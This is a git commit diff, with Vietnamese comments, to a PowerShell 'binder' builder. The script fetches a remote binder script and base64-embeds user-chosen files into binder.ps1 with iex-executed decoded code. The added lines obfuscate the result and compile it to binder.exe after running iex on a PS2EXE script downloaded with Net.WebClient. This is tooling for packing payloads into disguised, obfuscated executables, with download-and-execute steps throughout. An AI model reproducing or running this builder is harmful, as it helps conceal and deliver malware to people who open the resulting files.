c660f9a5d27dea9ab3a10be633446e335ff9b61f
43a1723 <hai1723notgay@gmail.com>
2024-06-29 17:29:53 +0700

    Update main.ps1

--- binderscr/main.ps1
+++ binderscr/main.ps1
@@ -1,5 +1,5 @@
 # URL chứa nội dung cần tải
-$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/main.ps1"
+$url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/binder.ps1"
 
 # Tạo thư mục mới nếu chưa tồn tại
 $directoryPath = ".\fileinhere"
@@ -13,24 +13,36 @@ $content = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandP
 $codebinder = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
 
 # Hiển thị danh sách các file trong thư mục đã tạo để chọn
-$files = Get-ChildItem -Path $directoryPath -File | Out-GridView -PassThru -Title "Chọn file để thêm vào main.ps1"
+$files = Get-ChildItem -Path $directoryPath -File | Out-GridView -PassThru -Title "Chọn file để thêm vào binder.ps1"
 
-# Xóa file main.ps1 nếu tồn tại
-if (Test-Path "main.ps1") {
-    Remove-Item "main.ps1"
+# Xóa file binder.ps1 nếu tồn tại
+if (Test-Path "binder.ps1") {
+    Remove-Item "binder.ps1"
 }
 
-# Tạo lại file main.ps1 và thêm nội dung cần thiết
+# Tạo lại file binder.ps1 và thêm nội dung cần thiết
 foreach ($file in $files) {
     # Đọc nội dung file và mã hóa base64
     $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($file.FullName))
     $fileName = $file.Name
 
-    # Thêm nội dung vào main.ps1
-    Add-Content -Path "main.ps1" -Value "`$Filecontent = '$fileContent'"
-    Add-Content -Path "main.ps1" -Value "`$name = '$fileName'"
-    Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
+    # Thêm nội dung vào binder.ps1
+    Add-Content -Path "binder.ps1" -Value "`$Filecontent = '$fileContent'"
+    Add-Content -Path "binder.ps1" -Value "`$name = '$fileName'"
+    Add-Content -Path "binder.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
 }
 
 # Thông báo hoàn thành
-Write-Output "Đã hoàn tất tạo file main.ps1"
+Write-Output "Đã hoàn tất tạo file binder.ps1"
+
+$fileContent = Get-Content -Path "binder.ps1" -Raw
+
+$base64Encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
+
+$code = Base64-Obfuscator -Data $base64Encoded
+
+Set-Content -Path "binder.ps1" -Value $code
+
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
+
+Invoke-ps2exe "binder.ps1" "binder.exe"
